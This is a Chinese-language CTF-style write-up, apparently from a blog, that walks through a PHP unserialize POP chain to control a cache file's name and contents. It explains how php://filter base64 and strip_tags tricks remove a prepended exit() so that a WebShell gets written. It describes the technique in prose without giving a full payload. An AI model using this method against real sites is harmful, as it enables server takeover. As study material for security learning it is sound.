在 exit() 代码后面拼接 $data 数据，然后写入文件。这种形式的利用好像不久前见 P 牛提过一次，翻了一下果然发现利用思路：谈一谈php://filter的妙用

文中巧用编码与解码帮助我们获取文件和去除一些“不必要的麻烦”

这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制

这里思路是利用 php://filter 提供的各种函数去除 “死亡exit”

接下来开始寻找 POP 链，只有两个类，链子还是比较好找的

序列化时将 $this->store 设置成 B 类，就可以成功触发 B 类的 set() 方法

$filename 由 B::getCacheKey() 拼接 $this->options['prefix'] 和 $name 后返回，$name 对应 A 类的 $this->key，因此可以直接控制 $filename 值

$data 由自定义的 B::serialize() 处理 $value 后返回，若 $value 不是数字或数字字符串就调用 $this->options['serialize']($value)，这里 options['serialize'] 是可控的，可以指定任意函数，$value 对应 A 类的 $contents

$contents 是由 A::getForStorage() 返回的 JSON 格式数据：

$cleaned 由 A::cleanContents() 返回，参数需要为数组，会对数组中 Value 为数组的项进行处理。这里直接赋空数组，控制 $this->complete 会更方便

至此，也可以控制 $data 值了，即为 B::serialize() 中$serialize($data) 的返回结果，其中

  • $serialize 为字符串
  • $data 为 JSON 格式数据

因此 $serialize 只能为函数，又因为这里传入的数据带有不少特殊字符，所以无法直接命令执行。回到写 WebShell 的思路，P 牛文章中提过可以通过 base64 去除部分特殊字符：

众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。

总结

对于一些 “可能引发冲突的代码”，可以考虑巧用编码与解码帮我们去除一些 “不必要的麻烦”

对于上述例子，也可以先将 WebShell 进行 base64 编码，再利用 php://filter 的 strip_tags 函数去除 <?php exit; ?>，最后利用 base64-decode 还原 WebShell
